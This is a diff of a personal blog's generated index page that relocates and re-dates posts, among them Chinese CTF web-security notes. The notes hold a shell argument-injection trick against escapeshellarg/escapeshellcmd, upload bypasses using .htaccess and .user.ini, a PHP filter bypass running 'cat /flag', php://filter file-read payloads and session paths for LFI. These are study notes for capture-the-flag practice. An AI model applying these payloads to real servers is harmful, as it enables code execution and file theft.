@@ -147,7 +147,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/13/Web%20Notes/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/14/%E8%AE%A1%E7%BD%91%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -161,7 +161,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/01/13/Web%20Notes/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/2021/01/14/%E8%AE%A1%E7%BD%91%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">计网笔记</a>
         </h2>
 
         <div class="post-meta">
@@ -172,165 +172,8 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-01-13 18:00:35 / Modified: 18:25:43" itemprop="dateCreated datePublished" datetime="2021-01-13T18:00:35+08:00">2021-01-13</time>
+              <time title="Created: 2021-01-14 10:07:31 / Modified: 10:07:42" itemprop="dateCreated datePublished" datetime="2021-01-14T10:07:31+08:00">2021-01-14</time>
             </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF WEB"></a>CTF WEB</h2><h3 id="PHP相关"><a href="#PHP相关" class="headerlink" title="PHP相关"></a>PHP相关</h3><ul>
-<li><p>利用<strong>scapeshellcmd</strong>逃脱<strong>escapeshellarg</strong>单引号的束缚</p>
-<p>传入的参数是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.17.0.2&#39; shellcode&#39;</span><br></pre></td></tr></table></figure>
-
-<p>经过escapeshellarg处理后变成了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;172.17.0.2&#39;\&#39;&#39; shellcode&#39;\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
-
-<p>即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p>
-<p>经过escapeshellcmd处理后变成</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;172.17.0.2&#39;\\&#39;&#39; shellcode&#39;\\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
-
-<p>这是因为escapeshellcmd对\以及最后那个不配对的引号进行了转义：</p>
-<p>最后执行的命令是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#39;172.17.0.2&#39;\\&#39;&#39; shellcode&#39;\\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
-
-<p>由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对成了一个空白连接符</p>
-<p>所以可以简化为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 172.17.0.2\ shellcode&#39;\&#39;</span><br></pre></td></tr></table></figure>
-
-<p>即向172.17.0.2\发起请求，并执行shellcode。</p>
-</li>
-<li><p>php 单引号只会解析转义字符</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\、\’</span><br></pre></td></tr></table></figure>
-
-<p>双引号则会解析变量的值，同时解析所有转义字符</p>
-</li>
-</ul>
-<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><ul>
-<li>在$v可控的情况下，可以传入元素为一个对象和函数名的数组，这样$v()就能调用这个对象的方法</li>
-<li>php反序列化逃逸参考这个<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6718">https://xz.aliyun.com/t/6718</a></li>
-</ul>
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ul>
-<li><p>低版本ngnix .htaccess 解析漏洞的利用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .png</span><br></pre></td></tr></table></figure>
-
-<p>可以将png文件解析为php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ul>
-<p>  把文件名包含1的解析为php</p>
-<ul>
-<li><p>php还可以写作php3,php5,phtml</p>
-</li>
-<li><p>对&lt;?的过滤可以用下面这个语句绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;php&gt;system(&quot;cat &#x2F;flag&quot;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>CGI／FastCGI 模式的服务器上.user.ini的利用</p>
-<p>auto_prepend_file和auto_append_file我们指定一个文件（如a.jpg），</p>
-<p>那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(.&#x2F;a.jpg);</span><br></pre></td></tr></table></figure>
-
-<p>这两个设置的区别只是在于auto_prepend_file是在文件前插入</p>
-<p>auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）</p>
-</li>
-<li><p>双文件上传绕过同时上传两个文件</p>
-<p>第一个文件为合法文件，第二个为马。php判断第一个文件合法即令 EnableUplad 的值为 True，是第二个文件成功绕过。</p>
-</li>
-</ul>
-<h3 id="文件包含-读取"><a href="#文件包含-读取" class="headerlink" title="文件包含/读取"></a>文件包含/读取</h3><ul>
-<li><p>file_get_contents:<br>$str = $_GET[‘cmd’];$a = file_get_contents($str,’r’);if($a === “XXXX”)<br>这时需要给cmd赋为php://input，这样就会读取post中的内容，但post格式不能为 multipart/form-data。<br>目录穿越时是不能出现文件的，只能是目录。</p>
-</li>
-<li><p>include：<br>读取文件时可以利用<br>file=php://filter/read=convert.base64-encode/resource=flag.phpfile=php://filter/convert.base64-encode/resource=index.php<br>读取文件内容。</p>
-</li>
-<li><p>LFI（local file inclusion vulnerability） To RCE：参考[这个](<a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/t/3639.html[https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#5-proc-self-environ]">https://bbs.zkaq.cn/t/3639.html[https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#5-proc-self-environ]</a>(<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B">https://www.k0rz3n.com/2018/11/20/一篇文章带你理解漏洞之</a> PHP 文件包含漏洞/#5-proc-self-environ))</p>
-</li>
-<li><p>phar:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	@unlink(&quot;phar.phar&quot;);</span><br><span class="line">	$phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">	$phar-&gt;startBuffering();</span><br><span class="line">	$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);&#x2F;&#x2F;设置stub</span><br><span class="line">	$phar-&gt;addFromString(&quot;head.txt&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;); &#x2F;&#x2F;添加要压缩的文件及内容</span><br><span class="line">	&#x2F;&#x2F;签名自动计算</span><br><span class="line">	$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-<ul>
-<li><p>data:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:,&lt;文本数据&gt;</span><br><span class="line">data:text&#x2F;plain,&lt;文本数据&gt;</span><br><span class="line">data:text&#x2F;html,&lt;HTML代码&gt;</span><br><span class="line">data:text&#x2F;html;base64,&lt;base64编码的HTML代码&gt;</span><br><span class="line">data:text&#x2F;css,&lt;CSS代码&gt;</span><br><span class="line">data:text&#x2F;css;base64,&lt;base64编码的CSS代码&gt;</span><br><span class="line">data:text&#x2F;javascript,&lt;Javascript代码&gt;</span><br><span class="line">data:text&#x2F;javascript;base64,&lt;base64编码的Javascript代码&gt;</span><br><span class="line">data:image&#x2F;gif;base64,base64编码的gif图片数据</span><br><span class="line">data:image&#x2F;png;base64,base64编码的png图片数据</span><br><span class="line">data:image&#x2F;jpeg;base64,base64编码的jpeg图片数据</span><br><span class="line">data:image&#x2F;x-icon;base64,base64编码的icon图片数据</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-<ul>
-<li><p>包含session</p>
-<p>session默认存放位置</p>
-<ul>
-<li>/var/lib/php/sess_PHPSESSID</li>
-<li>/var/lib/php/sessions/sess_PHPSESSID</li>
-<li>/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID</li>
-</ul>
-</li>
-</ul>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/13/%E8%AE%A1%E7%BD%91%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Manu Zhu">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Manu Zhu">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/13/%E8%AE%A1%E7%BD%91%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-01-13 17:44:49" itemprop="dateCreated datePublished" datetime="2021-01-13T17:44:49+08:00">2021-01-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-08 11:56:39" itemprop="dateModified" datetime="2021-01-08T11:56:39+08:00">2021-01-08</time>
-              </span>
 
           
 
@@ -950,7 +793,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -964,7 +807,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/01/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">操作系统复习笔记</a>
+            <a href="/2021/01/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">操作系统复习笔记</a>
         </h2>
 
         <div class="post-meta">
@@ -975,7 +818,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-01-06 11:31:25 / Modified: 11:31:53" itemprop="dateCreated datePublished" datetime="2021-01-06T11:31:25+08:00">2021-01-06</time>
+              <time title="Created: 2021-01-14 10:05:32 / Modified: 10:05:58" itemprop="dateCreated datePublished" datetime="2021-01-14T10:05:32+08:00">2021-01-14</time>
             </span>
 
           
@@ -1441,6 +1284,157 @@
 <p>文件目录管理</p>
 <p>文件目录：  文件名址录，记录文件名和存放地址的目录表  </p>
 <p>文件全名：  包括从根目录开始到文件为止的通路上所有子目录路径。  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/14/CTF-WEB-Notes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Manu Zhu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Manu Zhu">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/14/CTF-WEB-Notes/" class="post-title-link" itemprop="url">CTF WEB Notes</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-01-14 10:04:50 / Modified: 10:05:12" itemprop="dateCreated datePublished" datetime="2021-01-14T10:04:50+08:00">2021-01-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF WEB"></a>CTF WEB</h2><h3 id="PHP相关"><a href="#PHP相关" class="headerlink" title="PHP相关"></a>PHP相关</h3><ul>
+<li><p>利用<strong>scapeshellcmd</strong>逃脱<strong>escapeshellarg</strong>单引号的束缚</p>
+<p>传入的参数是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.17.0.2&#39; shellcode&#39;</span><br></pre></td></tr></table></figure>
+
+<p>经过escapeshellarg处理后变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;172.17.0.2&#39;\&#39;&#39; shellcode&#39;\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p>
+<p>经过escapeshellcmd处理后变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;172.17.0.2&#39;\\&#39;&#39; shellcode&#39;\\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这是因为escapeshellcmd对\以及最后那个不配对的引号进行了转义：</p>
+<p>最后执行的命令是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#39;172.17.0.2&#39;\\&#39;&#39; shellcode&#39;\\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对成了一个空白连接符</p>
+<p>所以可以简化为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 172.17.0.2\ shellcode&#39;\&#39;</span><br></pre></td></tr></table></figure>
+
+<p>即向172.17.0.2\发起请求，并执行shellcode。</p>
+</li>
+<li><p>php 单引号只会解析转义字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\、\’</span><br></pre></td></tr></table></figure>
+
+<p>双引号则会解析变量的值，同时解析所有转义字符</p>
+</li>
+</ul>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><ul>
+<li>在$v可控的情况下，可以传入元素为一个对象和函数名的数组，这样$v()就能调用这个对象的方法</li>
+<li>php反序列化逃逸参考这个<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6718">https://xz.aliyun.com/t/6718</a></li>
+</ul>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ul>
+<li><p>低版本ngnix .htaccess 解析漏洞的利用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .png</span><br></pre></td></tr></table></figure>
+
+<p>可以将png文件解析为php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<p>  把文件名包含1的解析为php</p>
+<ul>
+<li><p>php还可以写作php3,php5,phtml</p>
+</li>
+<li><p>对&lt;?的过滤可以用下面这个语句绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;php&gt;system(&quot;cat &#x2F;flag&quot;);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CGI／FastCGI 模式的服务器上.user.ini的利用</p>
+<p>auto_prepend_file和auto_append_file我们指定一个文件（如a.jpg），</p>
+<p>那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(.&#x2F;a.jpg);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这两个设置的区别只是在于auto_prepend_file是在文件前插入</p>
+<p>auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）</p>
+</li>
+<li><p>双文件上传绕过同时上传两个文件</p>
+<p>第一个文件为合法文件，第二个为马。php判断第一个文件合法即令 EnableUplad 的值为 True，是第二个文件成功绕过。</p>
+</li>
+</ul>
+<h3 id="文件包含-读取"><a href="#文件包含-读取" class="headerlink" title="文件包含/读取"></a>文件包含/读取</h3><ul>
+<li><p>file_get_contents:<br>$str = $_GET[‘cmd’];$a = file_get_contents($str,’r’);if($a === “XXXX”)<br>这时需要给cmd赋为php://input，这样就会读取post中的内容，但post格式不能为 multipart/form-data。<br>目录穿越时是不能出现文件的，只能是目录。</p>
+</li>
+<li><p>include：<br>读取文件时可以利用<br>file=php://filter/read=convert.base64-encode/resource=flag.phpfile=php://filter/convert.base64-encode/resource=index.php<br>读取文件内容。</p>
+</li>
+<li><p>LFI（local file inclusion vulnerability） To RCE：参考[这个](<a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/t/3639.html[https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#5-proc-self-environ]">https://bbs.zkaq.cn/t/3639.html[https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#5-proc-self-environ]</a>(<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B">https://www.k0rz3n.com/2018/11/20/一篇文章带你理解漏洞之</a> PHP 文件包含漏洞/#5-proc-self-environ))</p>
+</li>
+<li><p>phar:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	@unlink(&quot;phar.phar&quot;);</span><br><span class="line">	$phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">	$phar-&gt;startBuffering();</span><br><span class="line">	$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);&#x2F;&#x2F;设置stub</span><br><span class="line">	$phar-&gt;addFromString(&quot;head.txt&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;); &#x2F;&#x2F;添加要压缩的文件及内容</span><br><span class="line">	&#x2F;&#x2F;签名自动计算</span><br><span class="line">	$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>data:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data:,&lt;文本数据&gt;</span><br><span class="line">data:text&#x2F;plain,&lt;文本数据&gt;</span><br><span class="line">data:text&#x2F;html,&lt;HTML代码&gt;</span><br><span class="line">data:text&#x2F;html;base64,&lt;base64编码的HTML代码&gt;</span><br><span class="line">data:text&#x2F;css,&lt;CSS代码&gt;</span><br><span class="line">data:text&#x2F;css;base64,&lt;base64编码的CSS代码&gt;</span><br><span class="line">data:text&#x2F;javascript,&lt;Javascript代码&gt;</span><br><span class="line">data:text&#x2F;javascript;base64,&lt;base64编码的Javascript代码&gt;</span><br><span class="line">data:image&#x2F;gif;base64,base64编码的gif图片数据</span><br><span class="line">data:image&#x2F;png;base64,base64编码的png图片数据</span><br><span class="line">data:image&#x2F;jpeg;base64,base64编码的jpeg图片数据</span><br><span class="line">data:image&#x2F;x-icon;base64,base64编码的icon图片数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>包含session</p>
+<p>session默认存放位置</p>
+<ul>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sessions/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID</li>
+</ul>
+</li>
+</ul>
 
       
     </div>
